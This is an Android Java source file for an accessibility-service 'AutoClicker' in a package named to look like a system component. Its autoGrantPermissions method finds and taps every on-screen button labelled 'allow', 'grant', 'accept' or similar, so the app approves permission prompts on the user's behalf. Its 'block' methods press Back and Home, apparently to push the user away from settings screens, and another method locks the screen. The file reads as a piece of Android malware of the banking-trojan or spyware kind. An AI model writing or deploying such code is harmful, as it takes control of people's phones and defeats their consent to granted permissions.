package com.xrc.system.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.xrc.system.core.Constants;

import java.util.List;

public class AutoClicker {
    private static final String TAG = Constants.TAG + ":AutoClick";
    private final AccessibilityService service;
    private final Handler handler;

    public AutoClicker(AccessibilityService service) {
        this.service = service;
        this.handler = new Handler(Looper.getMainLooper());
    }

    public void clickNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        clickAt(bounds.centerX(), bounds.centerY());
    }

    public void clickAt(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        service.dispatchGesture(builder.build(), null, null);
    }

    public void swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        service.dispatchGesture(builder.build(), null, null);
    }

    public void autoGrantPermissions(AccessibilityNodeInfo root) {
        if (root == null) return;
        String[] targets = {"allow", "grant", "enable", "turn on", "activate",
                "confirm", "yes", "accept", "ok", "continue", "next"};
        for (String target : targets) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    clickNode(node);
                    handler.postDelayed(() -> {}, 200);
                }
            }
        }
    }

    public void blockBackButton() {
        handler.post(() -> service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK));
    }

    public void blockHomeButton() {
        handler.post(() -> service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME));
    }

    public void lockScreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
        }
    }
}
